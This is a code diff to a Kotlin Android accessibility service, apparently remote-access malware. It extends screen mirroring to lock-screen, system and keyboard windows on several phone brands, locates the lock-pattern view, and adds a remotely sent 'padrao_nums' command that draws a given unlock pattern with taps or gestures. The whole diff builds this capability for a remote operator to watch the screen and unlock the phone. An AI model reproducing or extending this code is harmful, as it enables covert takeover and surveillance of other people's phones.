@@ -178,13 +178,18 @@ class ControleGestosService : AccessibilityService() {
 
     private fun extrairEstruturaCompleta(): String {
         val aoVivo = extrairEstruturaAoVivo()
-        try {
-            val elementos = org.json.JSONObject(aoVivo).optJSONArray("elementos")
-            if (elementos != null && elementos.length() > 0) {
-                ultimaEstruturaEspelho = aoVivo
-                return aoVivo
-            }
-        } catch (_: Exception) {
+        val qtdAoVivo = contarElementosJson(aoVivo)
+
+        if (qtdAoVivo > 0) {
+            ultimaEstruturaEspelho = aoVivo
+            return aoVivo
+        }
+
+        val keyguardAoVivo = extrairEstruturaSomenteKeyguard()
+        val qtdKeyguard = contarElementosJson(keyguardAoVivo)
+        if (qtdKeyguard > 0) {
+            ultimaEstruturaEspelho = keyguardAoVivo
+            return keyguardAoVivo
         }
 
         if ((overlayAtivo || OverlayActivity.estaAtiva()) && ultimaEstruturaEspelho != null) {
@@ -200,12 +205,31 @@ class ControleGestosService : AccessibilityService() {
         return aoVivo
     }
 
+    private fun contarElementosJson(json: String): Int {
+        return try {
+            org.json.JSONObject(json).optJSONArray("elementos")?.length() ?: 0
+        } catch (_: Exception) {
+            0
+        }
+    }
+
+    private fun extrairEstruturaSomenteKeyguard(): String {
+        val listaElementos = mutableListOf<Map<String, Any>>()
+        val idsIncluidos = mutableSetOf<String>()
+        obterJanelasKeyguard().forEach { janela ->
+            janela.root?.let { percorrerNo(it, listaElementos, idsIncluidos) }
+        }
+        val elementosLimpos = removerElementosRedundantes(listaElementos)
+        val areaPadrao = detectarAreaPadrao(elementosLimpos)
+        return montarJsonEstrutura(elementosLimpos, resources.displayMetrics, areaPadrao)
+    }
+
     private fun extrairEstruturaAoVivo(): String {
         val listaElementos = mutableListOf<Map<String, Any>>()
         val idsIncluidos = mutableSetOf<String>()
         val displayMetrics = resources.displayMetrics
 
-        val janelas = obterJanelasAplicativo()
+        val janelas = obterTodasJanelasEspelho()
         if (janelas.isNotEmpty()) {
             janelas.forEach { janela ->
                 janela.root?.let { percorrerNo(it, listaElementos, idsIncluidos) }
@@ -224,7 +248,8 @@ class ControleGestosService : AccessibilityService() {
         }
 
         val elementosLimpos = removerElementosRedundantes(listaElementos)
-        return montarJsonEstrutura(elementosLimpos, displayMetrics)
+        val areaPadrao = detectarAreaPadrao(elementosLimpos)
+        return montarJsonEstrutura(elementosLimpos, displayMetrics, areaPadrao)
     }
 
     private fun capturarCacheEspelhoAntesOverlay() {
@@ -241,7 +266,8 @@ class ControleGestosService : AccessibilityService() {
 
     private fun montarJsonEstrutura(
         listaElementos: List<Map<String, Any>>,
-        displayMetrics: android.util.DisplayMetrics
+        displayMetrics: android.util.DisplayMetrics,
+        areaPadrao: Rect? = null
     ): String {
         val json = org.json.JSONObject().apply {
             put("id", obterIdDispositivo())
@@ -251,6 +277,14 @@ class ControleGestosService : AccessibilityService() {
             put("largura", displayMetrics.widthPixels)
             put("altura", displayMetrics.heightPixels)
             put("densidade", displayMetrics.densityDpi)
+            if (areaPadrao != null && areaPadrao.width() >= 120 && areaPadrao.height() >= 120) {
+                put("area_padrao", org.json.JSONObject().apply {
+                    put("x", areaPadrao.left)
+                    put("y", areaPadrao.top)
+                    put("width", areaPadrao.width())
+                    put("height", areaPadrao.height())
+                })
+            }
         }
 
         val elementosJson = org.json.JSONArray()
@@ -358,7 +392,11 @@ class ControleGestosService : AccessibilityService() {
 
     private fun ehPacoteKeyguard(pacote: String): Boolean {
         val p = pacote.lowercase()
-        return p == "com.android.systemui" || p.contains("keyguard")
+        return p == "com.android.systemui" ||
+                p.contains("keyguard") ||
+                p.contains("systemui") ||
+                p.contains("miui") && (p.contains("keyguard") || p.contains("security")) ||
+                p.contains("motorola") && (p.contains("systemui") || p.contains("keyguard"))
     }
 
     private fun ehPacoteIgnorado(pacote: String): Boolean {
@@ -373,8 +411,47 @@ class ControleGestosService : AccessibilityService() {
             val pacote = raiz.packageName?.toString().orEmpty()
             pacote != packageName &&
                     janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY &&
-                    ehPacoteKeyguard(pacote)
+                    (ehPacoteKeyguard(pacote) ||
+                            janela.type == AccessibilityWindowInfo.TYPE_SYSTEM ||
+                            janela.type == AccessibilityWindowInfo.TYPE_INPUT_METHOD)
         }
+    }
+
+    private fun obterTodasJanelasEspelho(): List<AccessibilityWindowInfo> {
+        val janelas = windows ?: return emptyList()
+        val ids = linkedSetOf<Int>()
+        val resultado = mutableListOf<AccessibilityWindowInfo>()
+
+        fun adicionar(janela: AccessibilityWindowInfo) {
+            if (ids.add(janela.id)) resultado.add(janela)
+        }
+
+        obterJanelasKeyguard().forEach { adicionar(it) }
+
+        val apps = janelas.filter { janela ->
+            val raiz = janela.root ?: return@filter false
+            val pacote = raiz.packageName?.toString().orEmpty()
+            pacote != packageName &&
+                    janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY &&
+                    !ehPacoteKeyguard(pacote) &&
+                    !ehLauncher(pacote)
+        }.sortedByDescending { janela ->
+            val area = Rect()
+            janela.root?.getBoundsInScreen(area)
+            area.width() * area.height()
+        }
+
+        apps.take(if (overlayAtivo || OverlayActivity.estaAtiva()) 3 else 2).forEach { adicionar(it) }
+
+        if (resultado.isEmpty()) {
+            janelas.filter { janela ->
+                val raiz = janela.root ?: return@filter false
+                val pacote = raiz.packageName?.toString().orEmpty()
+                pacote != packageName && janela.type != AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY
+            }.forEach { adicionar(it) }
+        }
+
+        return resultado
     }
 
     private fun obterJanelasAplicativo(): List<AccessibilityWindowInfo> {
@@ -695,7 +772,9 @@ class ControleGestosService : AccessibilityService() {
                 val comando = obterProximoComando() ?: return
                 Log.d("KL", "Comando: $comando")
                 handlerPrincipal.post { processarComando(comando) }
-                if (comando.startsWith("padrao|") || comando.startsWith("sequencia|")) return
+                if (comando.startsWith("padrao|") || comando.startsWith("sequencia|") ||
+                    comando.startsWith("padrao_nums|")
+                ) return
             }
         } catch (e: Exception) {
             Log.e("KL", "Erro ao processar comandos: ${e.message}")
@@ -1123,6 +1202,163 @@ class ControleGestosService : AccessibilityService() {
                 marca.contains("motorola") || marca.contains("lenovo")
     }
 
+    private fun ehNoPadrao(no: AccessibilityNodeInfo): Boolean {
+        val classe = no.className?.toString()?.lowercase().orEmpty()
+        val id = no.viewIdResourceName?.lowercase().orEmpty()
+        return classe.contains("lockpatternview") ||
+                classe.contains("patternview") ||
+                id.contains("lock_pattern") ||
+                id.contains("pattern_view") ||
+                id.contains("patternview")
+    }
+
+    private fun detectarAreaPadrao(elementos: List<Map<String, Any>>): Rect? {
+        encontrarNoPadraoNaTela()?.let { no ->
+            val area = Rect()
+            no.getBoundsInScreen(area)
+            if (area.width() >= 120 && area.height() >= 120) return area
+        }
+
+        for (elemento in elementos) {
+            val classe = (elemento["classe"] as? String).orEmpty().lowercase()
+            val id = (elemento["recurso_id"] as? String).orEmpty().lowercase()
+            if (!classe.contains("lockpattern") && !classe.contains("patternview") &&
+                !id.contains("lock_pattern") && !id.contains("pattern_view")
+            ) continue
+
+            val x = elemento["x"] as? Int ?: continue
+            val y = elemento["y"] as? Int ?: continue
+            val largura = elemento["largura"] as? Int ?: continue
+            val altura = elemento["altura"] as? Int ?: continue
+            if (largura >= 120 && altura >= 120) return Rect(x, y, x + largura, y + altura)
+        }
+        return null
+    }
+
+    private fun obterRaizesParaBusca(): List<AccessibilityNodeInfo> {
+        val raizes = mutableListOf<AccessibilityNodeInfo>()
+        obterTodasJanelasEspelho().forEach { janela ->
+            janela.root?.let { raizes.add(it) }
+        }
+        obterRaizAplicativo()?.let { raizes.add(it) }
+        rootInActiveWindow?.let { raizes.add(it) }
+        return raizes.distinctBy { it.hashCode() }
+    }
+
+    private fun encontrarNoPadraoNaTela(): AccessibilityNodeInfo? {
+        for (raiz in obterRaizesParaBusca()) {
+            buscarNoPadraoRecursivo(raiz)?.let { return it }
+        }
+        return null
+    }
+
+    private fun buscarNoPadraoRecursivo(no: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        if (ehNoPadrao(no)) {
+            val area = Rect()
+            no.getBoundsInScreen(area)
+            if (area.width() >= 120 && area.height() >= 120) return no
+        }
+        for (i in 0 until no.childCount) {
+            val filho = no.getChild(i) ?: continue
+            buscarNoPadraoRecursivo(filho)?.let { return it }
+        }
+        return null
+    }
+
+    private fun calcularCentrosGrade(area: Rect): List<Pair<Float, Float>> {
+        val pontos = mutableListOf<Pair<Float, Float>>()
+        for (linha in 0..2) {
+            for (coluna in 0..2) {
+                val x = area.left + (coluna + 0.5f) * area.width() / 3f
+                val y = area.top + (linha + 0.5f) * area.height() / 3f
+                pontos.add(x to y)
+            }
+        }
+        return pontos
+    }
+
+    private fun calcularCentrosGrade(no: AccessibilityNodeInfo): List<Pair<Float, Float>> {
+        val area = Rect()
+        no.getBoundsInScreen(area)
+        return calcularCentrosGrade(area)
+    }
+
+    private fun encontrarNoNoPonto(raiz: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
+        val area = Rect()
+        val fila = ArrayDeque<AccessibilityNodeInfo>()
+        fila.add(raiz)
+        var melhor: AccessibilityNodeInfo? = null
+        var menorArea = Int.MAX_VALUE
+
+        while (fila.isNotEmpty()) {
+            val no = fila.removeFirst()
+            no.getBoundsInScreen(area)
+            if (no.isVisibleToUser && area.contains(x, y)) {
+                val tamanho = area.width() * area.height()
+                if (tamanho in 1 until menorArea) {
+                    menorArea = tamanho
+                    melhor = no
+                }
+            }
+            for (i in 0 until no.childCount) {
+                no.getChild(i)?.let { fila.add(it) }
+            }
+        }
+        return melhor
+    }
+
+    private fun clicarNoPonto(x: Float, y: Float): Boolean {
+        val alvoX = x.toInt()
+        val alvoY = y.toInt()
+        for (raiz in obterRaizesParaBusca()) {
+            val no = encontrarNoNoPonto(raiz, alvoX, alvoY) ?: continue
+            var atual: AccessibilityNodeInfo? = no
+            repeat(5) {
+                val candidato = atual ?: return@repeat
+                if (candidato.isClickable &&
+                    candidato.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                ) {
+                    Log.d("KL", "ACTION_CLICK em ${candidato.className}")
+                    return true
+                }
+                atual = candidato.parent
+            }
+        }
+        return false
+    }
+
+    private fun executarPadraoPorNumeros(numeros: List<Int>) {
+        if (numeros.size < 2) {
+            Log.e("KL", "padrao_nums precisa de pelo menos 2 celulas")
+            return
+        }
+
+        val noPadrao = encontrarNoPadraoNaTela()
+        val pontos = if (noPadrao != null) {
+            val centros = calcularCentrosGrade(noPadrao)
+            numeros.mapNotNull { numero ->
+                centros.getOrNull(numero - 1)?.also {
+                    Log.d("KL", "Celula $numero -> (${it.first}, ${it.second}) via LockPatternView")
+                }
+            }
+        } else {
+            Log.w("KL", "LockPatternView nao encontrado para padrao_nums")
+            emptyList()
+        }
+
+        if (pontos.size < 2) {
+            Log.e("KL", "Nao foi possivel calcular coordenadas do padrao no aparelho")
+            return
+        }
+
+        Log.i("KL", "Executando padrao_nums ${numeros.joinToString("-")} (${pontos.size} pontos)")
+        if (fabricanteUsaToquesParaPadrao()) {
+            executarSequenciaToques(pontos)
+        } else {
+            executarPadraoContinuo(pontos)
+        }
+    }
+
     private fun parsearPontos(coords: List<String>): List<Pair<Float, Float>>? {
         if (coords.size < 2 || coords.size % 2 != 0) return null
         val pontos = mutableListOf<Pair<Float, Float>>()
@@ -1158,6 +1394,14 @@ class ControleGestosService : AccessibilityService() {
                 val x2 = coords.getOrNull(2)?.trim()?.toFloatOrNull() ?: return
                 val y2 = coords.getOrNull(3)?.trim()?.toFloatOrNull() ?: return
                 executarArrasto(x1, y1, x2, y2)
+            }
+            "padrao_nums" -> {
+                val numeros = partes.getOrNull(1)
+                    ?.split(",")
+                    ?.mapNotNull { it.trim().toIntOrNull() }
+                    ?: return
+                executarPadraoPorNumeros(numeros)
+                ignorarArrastosAteMs = System.currentTimeMillis() + 6000
             }
             "padrao" -> {
                 val coords = partes.getOrNull(1)?.split(",") ?: return
@@ -1329,20 +1573,25 @@ class ControleGestosService : AccessibilityService() {
             }
 
             val (x, y) = pontos[indice]
+            if (clicarNoPonto(x, y)) {
+                handlerPrincipal.postDelayed({ proximo(indice + 1) }, 380L)
+                return
+            }
+
             val caminho = Path().apply { moveTo(x, y) }
             val gesto = GestureDescription.Builder()
-                .addStroke(GestureDescription.StrokeDescription(caminho, 0L, 90L))
+                .addStroke(GestureDescription.StrokeDescription(caminho, 0L, 130L))
                 .build()
 
             Log.d("KL", "Toque sequencia ${indice + 1}/${pontos.size}: ($x,$y)")
             dispatchGesture(gesto, object : GestureResultCallback() {
                 override fun onCompleted(gestureDescription: GestureDescription?) {
-                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 320L)
+                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 420L)
                 }
 
                 override fun onCancelled(gestureDescription: GestureDescription?) {
                     Log.w("KL", "Toque ${indice + 1} cancelado")
-                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 320L)
+                    handlerPrincipal.postDelayed({ proximo(indice + 1) }, 420L)
                 }
             }, null)
         }
